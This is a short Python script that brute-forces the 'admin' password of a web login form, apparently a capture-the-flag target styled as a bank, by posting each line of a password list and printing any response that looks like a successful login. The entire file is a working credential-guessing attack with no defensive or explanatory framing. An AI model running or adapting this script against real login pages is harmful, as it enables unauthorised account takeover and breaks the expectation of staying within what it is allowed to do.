#!/usr/bin/env python

import requests
import string
import time

url = "https://mr-johnsons-bank-1-bvel4oasra-uc.a.run.app/"
data = {
    "username":"admin",
    "password":""
}

with open('pass.txt', 'r') as f:
    passwd ='ttt'
    while(passwd):
        passwd = f.readline().strip()
        #print(passwd, flush=True)
        data["password"] = passwd
        resp = requests.post(url, data, allow_redirects=False)
        if("error" not in resp.text or resp.status_code != 302):
            print(f"pass: {data['password']}")
            print(resp.text)
        print('.', flush=True, end='')